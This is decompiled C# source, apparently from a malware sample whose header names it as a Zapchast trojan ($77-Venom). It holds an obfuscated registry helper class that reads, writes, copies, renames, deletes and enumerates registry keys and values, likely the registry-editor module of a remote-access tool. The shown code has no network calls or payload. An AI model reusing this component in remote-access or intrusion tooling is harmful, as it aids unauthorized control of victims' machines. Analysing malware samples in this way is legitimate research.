// Decompiled with JetBrains decompiler
// Type: 豇�ᛊỦ餢뜨Ꮉ퐃㍹됾붽갫䖫ᯃ੾衊佂췎
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;

public static class 豇\uFFFD\uEBA1ᛊ\uE28CỦ餢뜨Ꮉ퐃\u3379됾붽갫䖫ᯃ\u0A7E衊佂췎
{
  private static bool IsNameOrValueNull(this string keyName, RegistryKey key) => string.IsNullOrEmpty(keyName) || key == null;

  public static string GetValueSafe(this RegistryKey key, string keyName, string defaultValue = "")
  {
    try
    {
      return key.GetValue(keyName, (object) defaultValue).ToString();
    }
    catch
    {
      return defaultValue;
    }
  }

  public static RegistryKey OpenReadonlySubKeySafe(this RegistryKey key, string name)
  {
    try
    {
      return key.OpenSubKey(name, false);
    }
    catch
    {
      return (RegistryKey) null;
    }
  }

  public static RegistryKey OpenWritableSubKeySafe(this RegistryKey key, string name)
  {
    try
    {
      return key.OpenSubKey(name, true);
    }
    catch
    {
      return (RegistryKey) null;
    }
  }

  public static RegistryKey CreateSubKeySafe(this RegistryKey key, string name)
  {
    try
    {
      return key.CreateSubKey(name);
    }
    catch
    {
      return (RegistryKey) null;
    }
  }

  public static bool DeleteSubKeyTreeSafe(this RegistryKey key, string name)
  {
    try
    {
      key.DeleteSubKeyTree(name, true);
      return true;
    }
    catch
    {
      return false;
    }
  }

  public static bool RenameSubKeySafe(this RegistryKey key, string oldName, string newName)
  {
    try
    {
      key.CopyKey(oldName, newName);
      key.DeleteSubKeyTree(oldName);
      return true;
    }
    catch
    {
      key.DeleteSubKeyTreeSafe(newName);
      return false;
    }
  }

  public static void CopyKey(this RegistryKey key, string oldName, string newName)
  {
    using (RegistryKey subKey = key.CreateSubKey(newName))
    {
      using (RegistryKey sourceKey = key.OpenSubKey(oldName, true))
        豇\uFFFD\uEBA1ᛊ\uE28CỦ餢뜨Ꮉ퐃\u3379됾붽갫䖫ᯃ\u0A7E衊佂췎.\uE7E9\uE342\u236C筨ꥦગ鼛䇸츙ၵ傋륜워犿궔邕䯽诰뽎\u27EF(sourceKey, subKey);
    }
  }

  private static void \uE7E9\uE342\u236C筨ꥦગ鼛䇸츙ၵ傋륜워犿궔邕䯽诰뽎\u27EF(
    RegistryKey sourceKey,
    RegistryKey destKey)
  {
    foreach (string valueName in sourceKey.GetValueNames())
    {
      object obj = sourceKey.GetValue(valueName);
      RegistryValueKind valueKind = sourceKey.GetValueKind(valueName);
      destKey.SetValue(valueName, obj, valueKind);
    }
    foreach (string subKeyName in sourceKey.GetSubKeyNames())
    {
      using (RegistryKey sourceKey1 = sourceKey.OpenSubKey(subKeyName))
      {
        using (RegistryKey subKey = destKey.CreateSubKey(subKeyName))
          豇\uFFFD\uEBA1ᛊ\uE28CỦ餢뜨Ꮉ퐃\u3379됾붽갫䖫ᯃ\u0A7E衊佂췎.\uE7E9\uE342\u236C筨ꥦગ鼛䇸츙ၵ傋륜워犿궔邕䯽诰뽎\u27EF(sourceKey1, subKey);
      }
    }
  }

  public static bool SetValueSafe(
    this RegistryKey key,
    string name,
    object data,
    RegistryValueKind kind)
  {
    try
    {
      key.SetValue(name, data, kind);
      return true;
    }
    catch
    {
      return false;
    }
  }

  public static bool DeleteValueSafe(this RegistryKey key, string name)
  {
    try
    {
      key.DeleteValue(name);
      return true;
    }
    catch
    {
      return false;
    }
  }

  public static bool RenameValueSafe(this RegistryKey key, string oldName, string newName)
  {
    try
    {
      key.CopyValue(oldName, newName);
      key.DeleteValue(oldName);
      return true;
    }
    catch
    {
      key.DeleteValueSafe(newName);
      return false;
    }
  }

  public static void CopyValue(this RegistryKey key, string oldName, string newName)
  {
    RegistryValueKind valueKind = key.GetValueKind(oldName);
    object obj = key.GetValue(oldName);
    key.SetValue(newName, obj, valueKind);
  }

  public static bool ContainsSubKey(this RegistryKey key, string name)
  {
    foreach (string subKeyName in key.GetSubKeyNames())
    {
      if (subKeyName == name)
        return true;
    }
    return false;
  }

  public static bool ContainsValue(this RegistryKey key, string name)
  {
    foreach (string valueName in key.GetValueNames())
    {
      if (valueName == name)
        return true;
    }
    return false;
  }

  public static IEnumerable<string> GetFormattedKeyValues(this RegistryKey key)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    豇\uFFFD\uEBA1ᛊ\uE28CỦ餢뜨Ꮉ퐃\u3379됾붽갫䖫ᯃ\u0A7E衊佂췎.縔ἀ糆㮐䊚䇜㝵鳜\uE390텽투鄴垃粄ꪈ촉疥俩膨燑 縔ἀ糆㮐䊚䇜㝵鳜텽투鄴垃粄ꪈ촉疥俩膨燑 = new 豇\uFFFD\uEBA1ᛊ\uE28CỦ餢뜨Ꮉ퐃\u3379됾붽갫䖫ᯃ\u0A7E衊佂췎.縔ἀ糆㮐䊚䇜㝵鳜\uE390텽투鄴垃粄ꪈ촉疥俩膨燑();
    // ISSUE: reference to a compiler-generated field
    縔ἀ糆㮐䊚䇜㝵鳜텽투鄴垃粄ꪈ촉疥俩膨燑.蹯㸕ҟ\uEB1C迖\uEEF9ꚕ硔㷂葱\uFFFD越\uFFFD\uFFFD勧刹㝮\uE5A5㙝መ = key;
    // ISSUE: reference to a compiler-generated field
    if (縔ἀ糆㮐䊚䇜㝵鳜텽투鄴垃粄ꪈ촉疥俩膨燑.蹯㸕ҟ\uEB1C迖\uEEF9ꚕ硔㷂葱\uFFFD越\uFFFD\uFFFD勧刹㝮\uE5A5㙝መ != null)
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated method
      foreach (string keyName in ((IEnumerable<string>) 縔ἀ糆㮐䊚䇜㝵鳜텽투鄴垃粄ꪈ촉疥俩膨燑.蹯㸕ҟ\uEB1C迖\uEEF9ꚕ硔㷂葱\uFFFD越\uFFFD\uFFFD勧刹㝮\uE5A5㙝መ.GetValueNames()).Where<string>(縔ἀ糆㮐䊚䇜㝵鳜텽투鄴垃粄ꪈ촉疥俩膨燑.넃\uF07Bꋼ㠧\uE1F3ޞ㻘㩪曄饃藮䊸\u2A16\uF4E9\uFFFD鳦ᄷ墹Ћᜬ ?? (縔ἀ糆㮐䊚䇜㝵鳜텽투鄴垃粄ꪈ촉疥俩膨燑.넃\uF07Bꋼ㠧\uE1F3ޞ㻘㩪曄饃藮䊸\u2A16\uF4E9\uFFFD鳦ᄷ墹Ћᜬ = new Func<string, bool>(縔ἀ糆㮐䊚䇜㝵鳜텽투鄴垃粄ꪈ촉疥俩膨燑.曯푰쀣\u234C\u2A51横眪ŏ깦ᚃ\u32DF発\uE05D箾\uFFFD晗\u001C䩘\uEF11綾))).Where<string>((Func<string, bool>) (k => !string.IsNullOrEmpty(k))))
      {
        // ISSUE: reference to a compiler-generated field
        yield return string.Format("{0}||{1}", (object) keyName, (object) 縔ἀ糆㮐䊚䇜㝵鳜텽투鄴垃粄ꪈ촉疥俩膨燑.蹯㸕ҟ\uEB1C迖\uEEF9ꚕ硔㷂葱\uFFFD越\uFFFD\uFFFD勧刹㝮\uE5A5㙝መ.GetValueSafe(keyName));
      }
    }
  }

  public static object GetDefault(this RegistryValueKind valueKind)
  {
    switch (valueKind)
    {
      case RegistryValueKind.String:
      case RegistryValueKind.ExpandString:
        return (object) "";
      case RegistryValueKind.Binary:
        return (object) new byte[0];
      case RegistryValueKind.DWord:
        return (object) 0;
      case RegistryValueKind.MultiString:
        return (object) new string[0];
      case RegistryValueKind.QWord:
        return (object) 0L;
      default:
        return (object) null;
    }
  }
}
